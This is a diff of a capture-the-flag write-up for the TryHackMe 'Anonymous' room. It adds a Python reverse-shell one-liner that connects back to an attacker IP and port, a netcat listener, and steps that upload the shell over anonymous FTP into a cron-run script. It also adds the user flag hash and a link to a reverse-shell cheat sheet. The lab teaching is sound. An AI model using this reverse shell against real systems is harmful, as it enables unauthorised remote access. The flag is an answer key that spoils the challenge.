@@ -2,7 +2,7 @@
 description: 'https://tryhackme.com/room/anonymous'
 ---
 
-# anonymous
+# Anonymous
 
 ## Task 1 Pwn
 
@@ -48,10 +48,34 @@ enum4linux -S 10.10.17.122
 
 ### user.txt 
 
+![](../.gitbook/assets/image%20%28257%29.png)
+
 ![](../.gitbook/assets/image%20%28250%29.png)
 
-{% hint style="success" %}
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}
 
+```text
+nc -nvlp 4444
+
+mget *
+ls -all
+vi clean.sh
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.4.204",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+ftp 10.10.178.0
+anonymous
+password
+cd scripts
+mput clean.sh
+y
+```
+
+![](../.gitbook/assets/image%20%28255%29.png)
+
+![](../.gitbook/assets/image%20%28256%29.png)
+
+{% hint style="success" %}
+90d6f992585815ff991e68748c414740
 {% endhint %}
 
 ### root.txt
